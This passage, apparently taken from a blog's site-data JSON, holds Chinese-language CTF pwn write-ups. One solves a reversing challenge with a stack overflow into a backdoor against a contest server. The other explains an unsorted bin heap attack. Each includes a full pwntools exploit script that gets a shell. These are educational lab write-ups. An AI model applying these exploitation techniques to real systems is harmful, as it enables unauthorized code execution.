class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">input_val</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">\tp.send(p8(num))</span><br><span class=\"line\"><span class=\"comment\">#first if is false</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">\tinput_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">p.sendline(p8(<span class=\"number\">32</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">word2 = <span class=\"string\">&#x27;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe&#x27;</span></span><br><span class=\"line\">key2 = <span class=\"string\">&#x27;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCf&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(key2)</span><br><span class=\"line\"></span><br><span class=\"line\">word3 =  <span class=\"string\">&#x27;eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(word3)</span><br><span class=\"line\"></span><br><span class=\"line\">word4 = <span class=\"string\">&#x27;wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO&#x27;</span></span><br><span class=\"line\">key4 = <span class=\"string\">&#x27;vGv&#125;uTiSvbNgLnMp~f``cnBHGN&#125;tNmHXuC&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(word4)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    input_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.01</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;9255 &#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;1 &#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    input_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.01</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">word6 = <span class=\"string\">&#x27;vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#print(word6.lower())</span></span><br><span class=\"line\">xor=<span class=\"number\">3808198460</span></span><br><span class=\"line\">key6  = <span class=\"string\">&#x27;\\x3c\\x7f\\xfc\\xe2&#x27;</span></span><br><span class=\"line\">key6=key6.ljust(<span class=\"number\">42</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print(data)</span></span><br><span class=\"line\"><span class=\"comment\">#print(key6)</span></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(key6)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*padding+p64(backdoor)</span><br><span class=\"line\">p.sendline(payload.ljust(<span class=\"number\">0x37</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#solved</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>好像是美团的比赛，纯纯的逆向题</p>","more":"<p>捉迷藏，有后门，控制函数流程到栈溢出的函数。</p>\n<p>主要要绕的就是两种，一种是要求控制input_val()的值，另一种是fksth()，会和一个指定的字符串进行比较，要求你控制比较的结果，不过后面你的输出会被xor修改。</p>\n<p>input_val:相当于atoi()把你输入的字符串转化为数字，以’ ‘作为结束符，长度最大为19</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">input_val</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v0; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> nptr[<span class=\"number\">27</span>]; <span class=\"comment\">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v3[<span class=\"number\">5</span>]; <span class=\"comment\">// [rsp+1Bh] [rbp-5h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3[<span class=\"number\">4</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)v3 = (<span class=\"type\">unsigned</span> __int8)getchar();   <span class=\"comment\">// 输入v3[0],v3[1]=0 unsigned int8 0~255</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v3[<span class=\"number\">0</span>] != <span class=\"number\">32</span> &amp;&amp; *(<span class=\"type\">int</span> *)&amp;v3[<span class=\"number\">1</span>] &lt;= <span class=\"number\">18</span> ) <span class=\"comment\">// v3[1]是循环次数最多19次，输入v3[0]==32==&#x27; &#x27;可以强行终止循环</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v0 = (*(_DWORD *)&amp;v3[<span class=\"number\">1</span>])++;                 <span class=\"comment\">// v0=v3[1];v3[1]++;即每次写nptr的1byte</span></span><br><span class=\"line\">    nptr[v0] = v3[<span class=\"number\">0</span>];                           <span class=\"comment\">// nptr每1byte用v3[0]赋值</span></span><br><span class=\"line\">    v3[<span class=\"number\">0</span>] = getchar();                          <span class=\"comment\">// 输入v3[0]</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  nptr[*(<span class=\"type\">int</span> *)&amp;v3[<span class=\"number\">1</span>]] = <span class=\"number\">0</span>;                     <span class=\"comment\">// 加个结束符</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> atoi(nptr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n<p>fks_sth:类似strcmp()，不过返回的是str1和str2各位的ascii码的差的和</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">fksth</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; *(_BYTE *)(i + a1) &amp;&amp; *(_BYTE *)(i + a2); ++i )</span><br><span class=\"line\">    v4 += *(<span class=\"type\">char</span> *)(i + a1) - *(<span class=\"type\">char</span> *)(i + a2);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>第一个if需要得到false</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input_val();</span><br><span class=\"line\">input_val();</span><br><span class=\"line\">input_val();</span><br><span class=\"line\">v4 = input_val();</span><br><span class=\"line\">input_val();</span><br><span class=\"line\">input_val();</span><br><span class=\"line\">v5 = input_val();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v5 + v4 + input_val() == <span class=\"number\">2187</span> )          <span class=\"comment\">// 要false，随便输一下不等于即可</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">\tinput_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">p.sendline(p8(<span class=\"number\">32</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">//随便sendline()<span class=\"number\">8</span>次就可以了</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>第二个if需要true</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input_line((__int64)&amp;key2, <span class=\"number\">51uLL</span>);<span class=\"comment\">//输入一行作为Key2，共51byte</span></span><br><span class=\"line\">key2 ^= <span class=\"number\">1043327323u</span>;<span class=\"comment\">//xor处理</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fksth((__int64)&amp;key2, (__int64)<span class=\"string\">&quot;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe&quot;</span>) )</span><br></pre></td></tr></table></figure>\n\n<p>其实不用太仔细去考究他的xor，甚至原封不动输回去也可以过。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">word2 = <span class=\"string\">&#x27;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe&#x27;</span></span><br><span class=\"line\">key2 = <span class=\"string\">&#x27;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCf&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(key2)</span><br></pre></td></tr></table></figure>\n\n<p>第三个if也要true</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input_line((__int64)&amp;key3, <span class=\"number\">53uLL</span>);<span class=\"comment\">//输入一行作为Key2，共53byte</span></span><br><span class=\"line\">key3 ^= <span class=\"number\">3585375674u</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fksth((__int64)&amp;key3, (__int64)<span class=\"string\">&quot;eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR&quot;</span>) )</span><br></pre></td></tr></table></figure>\n\n<p>同上</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">word3 =  <span class=\"string\">&#x27;eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR&#x27;</span></span><br><span class=\"line\">p.sendline(word3)</span><br></pre></td></tr></table></figure>\n\n<p>第四个if也要true</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input_line((__int64)&amp;key4, <span class=\"number\">34uLL</span>);</span><br><span class=\"line\">HIBYTE(key4) ^= <span class=\"number\">0x8B</span>u;</span><br><span class=\"line\">*(_WORD *)((<span class=\"type\">char</span> *)&amp;key4 + <span class=\"number\">1</span>) ^= <span class=\"number\">0x20C1</span>u;</span><br><span class=\"line\">LOBYTE(key4) = key4 ^ <span class=\"number\">0x30</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fksth((__int64)&amp;key4, (__int64)<span class=\"string\">&quot;wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO&quot;</span>) )</span><br></pre></td></tr></table></figure>\n\n<p>花里胡哨的，但也同上</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">word4 = <span class=\"string\">&#x27;wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO&#x27;</span></span><br><span class=\"line\">p.send(word4)</span><br></pre></td></tr></table></figure>\n\n<p>第五个if也要true</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v6 = input_val();</span><br><span class=\"line\">v7 = input_val();</span><br><span class=\"line\">v8 = input_val();</span><br><span class=\"line\">key51 = input_val();</span><br><span class=\"line\">key52 = input_val();</span><br><span class=\"line\">v11 = input_val();</span><br><span class=\"line\">v12 = input_val();</span><br><span class=\"line\">v13 = input_val();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( key51 - key52 == <span class=\"number\">9254</span> )</span><br></pre></td></tr></table></figure>\n\n<p>让key51=9255,key52=1即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    input_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.01</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;9255 &#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;1 &#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    input_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.01</span>)</span><br></pre></td></tr></table></figure>\n\n<p>第六个if也要true</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input_line((__int64)&amp;key6, <span class=\"number\">42uLL</span>);</span><br><span class=\"line\">key6 ^= <span class=\"number\">0xE2FC7F3C</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fksth((__int64)&amp;key6, (__int64)<span class=\"string\">&quot;vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM&quot;</span>) )</span><br></pre></td></tr></table></figure>\n\n<p>只要ascii码小于每一位就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">word6 = <span class=\"string\">&#x27;vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM&#x27;</span></span><br><span class=\"line\">key6  = <span class=\"string\">&#x27;\\x3c\\x7f\\xfc\\xe2&#x27;</span></span><br><span class=\"line\">key6=key6.ljust(<span class=\"number\">42</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">p.send(key6)</span><br></pre></td></tr></table></figure>\n\n<p>之后栈溢出返回backdoor()即可get shell。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./pwn&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;39.106.133.19&#x27;</span>,<span class=\"number\">31888</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">padding=<span class=\"number\">0xf</span>+<span class=\"number\">0x8</span></span><br><span class=\"line\">backdoor=<span class=\"number\">0x40132c</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">input_val</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">\tp.send(p8(num))</span><br><span class=\"line\"><span class=\"comment\">#first if is false</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">\tinput_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">p.sendline(p8(<span class=\"number\">32</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">word2 = <span class=\"string\">&#x27;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe&#x27;</span></span><br><span class=\"line\">key2 = <span class=\"string\">&#x27;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCf&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(key2)</span><br><span class=\"line\"></span><br><span class=\"line\">word3 =  <span class=\"string\">&#x27;eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(word3)</span><br><span class=\"line\"></span><br><span class=\"line\">word4 = <span class=\"string\">&#x27;wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO&#x27;</span></span><br><span class=\"line\">key4 = <span class=\"string\">&#x27;vGv&#125;uTiSvbNgLnMp~f``cnBHGN&#125;tNmHXuC&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(word4)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    input_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.01</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;9255 &#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;1 &#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    input_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.01</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">word6 = <span class=\"string\">&#x27;vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#print(word6.lower())</span></span><br><span class=\"line\">xor=<span class=\"number\">3808198460</span></span><br><span class=\"line\">key6  = <span class=\"string\">&#x27;\\x3c\\x7f\\xfc\\xe2&#x27;</span></span><br><span class=\"line\">key6=key6.ljust(<span class=\"number\">42</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print(data)</span></span><br><span class=\"line\"><span class=\"comment\">#print(key6)</span></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(key6)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*padding+p64(backdoor)</span><br><span class=\"line\">p.sendline(payload.ljust(<span class=\"number\">0x37</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#solved</span></span><br></pre></td></tr></table></figure>"},{"title":"magic heap","date":"2023-01-02T11:54:26.000Z","_content":"\n一道unsorted bin attack的题目，利用unsorted bin attack修改值来绕过if条件\n\n<!-- more -->\n\n**unsorted bin attack**\n\n查壳，64位，保护几乎全开。\n\n一道菜单题，在edit函数中没有限制写入的size，存在堆溢出。133t函数是个后门函数，需要修改bss段的magic>0x1305后，选择4869进入，即可get shell。\n\n原本以为是利用fast bin attack将magic所在的内存malloc出来，然后通过edit函数修改magic的值。后来发现不能malloc出来，调试的时候发现报错说指针非法。\n\n后来看到是使用**unsorted bin attack**，unsorted bin attack可以将一个地址的值写为一个**非常大**的数，可以满足题目的需求。\n\nunsorted bin attack原理：\n\n在unsorted bin中，遵循FIFO的原则，free chunk采用双向链表连接。当从unsorted bin中取出chunk时，会从unsorted bin的末尾取出，在取出的过程中会执行bk->fd=unsorted_bin(av)，通过bk找到前一个chunk，将前一个chunk的fd指向unsorted bin的头结点。\n\n如果通过一些方法（如堆溢出），可以控制取出chunk的bk指针，那么就可以将*bk+0x10的位置修改为unsorted bin头结点的地址，这个地址的值是很大的。\n\nexp:\n\n```python\nfrom pwn import*\nelf=ELF(\"./magicheap2\")\np=process(\"./magicheap2\")\n#p=remote()\ncontext.log_level='debug'\nmagic=0x6020A0\n\ndef create(size,content):\n    p.recv()\n    p.sendline('1')\n    p.recvuntil(\"Size of Heap : \")\n    p.sendline(str(size))\n    p.recvuntil(\"Content of heap:\")\n    p.sendline(content)\n    p.recvuntil(\"SuccessFul\")\n\ndef edit(idx,size,content):\n    p.recv()\n    p.sendline('2')\n    p.recvuntil(\"Index :\")\n    p.sendline(str(idx))\n    p.recvuntil(\"Size of Heap : \")\n    p.sendline(str(size))\n    p.recvuntil(\"Content of heap : \")\n    p.sendline(content)\n    p.recvuntil(\"Done !\")\n\ndef delete(idx):\n    p.recv()\n    p.sendline('3')\n    p.recvuntil(\"Index :\")\n    p.sendline(str(idx))\n    p.recvuntil(\"Done !\")\n\ndef get_shell():\n    p.recv()\n    p.sendline('4869')\n    p.recv()\n    p.interactive()\n\nfake_chunk=0x60207d\n\ncreate(0x20,'chunk0')\ncreate(0x80,'chunk1')\ncreate(0x20,'chunk2')\ndelete(1)\npayload='a'*0x20+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)\n#gdb.attach(p)\nedit(0,0x40,payload)\ncreate(0x80,'chunk1')\nget_shell()\n\n```","source":"_posts/magicheap.md","raw":"---\ntitle: magic heap\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n\n---\n\n一道unsorted bin attack的题目，利用unsorted bin attack修改值来绕过if条件\n\n<!-- more -->\n\n**unsorted bin attack**\n\n查壳，64位，保护几乎全开。\n\n一道菜单题，在edit函数中没有限制写入的size，存在堆溢出。133t函数是个后门函数，需要修改bss段的magic>0x1305后，选择4869进入，即可get shell。\n\n原本以为是利用fast bin attack将magic所在的内存malloc出来，然后通过edit函数修改magic的值。后来发现不能malloc出来，调试的时候发现报错说指针非法。\n\n后来看到是使用**unsorted bin attack**，unsorted bin attack可以将一个地址的值写为一个**非常大**的数，可以满足题目的需求。\n\nunsorted bin attack原理：\n\n在unsorted bin中，遵循FIFO的原则，free chunk采用双向链表连接。当从unsorted bin中取出chunk时，会从unsorted bin的末尾取出，在取出的过程中会执行bk->fd=unsorted_bin(av)，通过bk找到前一个chunk，将前一个chunk的fd指向unsorted bin的头结点。\n\n如果通过一些方法（如堆溢出），可以控制取出chunk的bk指针，那么就可以将*bk+0x10的位置修改为unsorted bin头结点的地址，这个地址的值是很大的。\n\nexp:\n\n```python\nfrom pwn import*\nelf=ELF(\"./magicheap2\")\np=process(\"./magicheap2\")\n#p=remote()\ncontext.log_level='debug'\nmagic=0x6020A0\n\ndef create(size,content):\n    p.recv()\n    p.sendline('1')\n    p.recvuntil(\"Size of Heap : \")\n    p.sendline(str(size))\n    p.recvuntil(\"Content of heap:\")\n    p.sendline(content)\n    p.recvuntil(\"SuccessFul\")\n\ndef edit(idx,size,content):\n    p.recv()\n    p.sendline('2')\n    p.recvuntil(\"Index :\")\n    p.sendline(str(idx))\n    p.recvuntil(\"Size of Heap : \")\n    p.sendline(str(size))\n    p.recvuntil(\"Content of heap : \")\n    p.sendline(content)\n    p.recvuntil(\"Done !\")\n\ndef delete(idx):\n    p.recv()\n    p.sendline('3')\n    p.recvuntil(\"Index :\")\n    p.sendline(str(idx))\n    p.recvuntil(\"Done !\")\n\ndef get_shell():\n    p.recv()\n    p.sendline('4869')\n    p.recv()\n    p.interactive()\n\nfake_chunk=0x60207d\n\ncreate(0x20,'chunk0')\ncreate(0x80,'chunk1')\ncreate(0x20,'chunk2')\ndelete(1)\npayload='a'*0x20+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)\n#gdb.attach(p)\nedit(0,0x40,payload)\ncreate(0x80,'chunk1')\nget_shell()\n\n```","slug":"magicheap","published":1,"updated":"2023-01-02T15:47:34.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag400465oud0cuthpis","content":"<p>一道unsorted bin attack的题目，利用unsorted bin attack修改值来绕过if条件</p>\n<span id=\"more\"></span>\n\n<p><strong>unsorted bin 